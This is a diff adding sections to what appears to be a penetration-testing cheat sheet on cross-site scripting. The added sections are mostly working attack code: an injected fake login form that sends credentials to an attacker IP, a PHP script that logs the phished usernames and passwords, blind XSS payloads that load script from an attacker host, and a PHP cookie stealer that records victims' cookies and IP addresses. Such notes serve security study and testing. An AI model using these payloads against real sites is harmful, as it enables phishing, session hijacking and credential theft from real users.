@@ -202,6 +202,26 @@ document.onkeypress = function (e) {
 };
 ```
 
+### Fake Form
+
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://10.10.14.4:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
+```
+
+Use with a fake server script 
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
 ## DOM-Based XSS
 
 ### Common Sources (where attacker-controlled data enters)
@@ -233,6 +253,35 @@ document.onkeypress = function (e) {
 - [ ] Use browser DevTools to set breakpoints on sink functions
 - [ ] Check for DOM clobbering opportunities (`id` or `name` attributes overriding global variables)
 
+## Blind XSS
+
+Sample payloads
+
+```html
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+Cookie Stealer
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
 ## Common Encoding Bypasses
 
 | Filter                | Bypass                                                                          |
@@ -252,3 +301,5 @@ document.onkeypress = function (e) {
 - [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 - [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
+- [payload-box](https://github.com/payload-box/xss-payload-list)
+- 
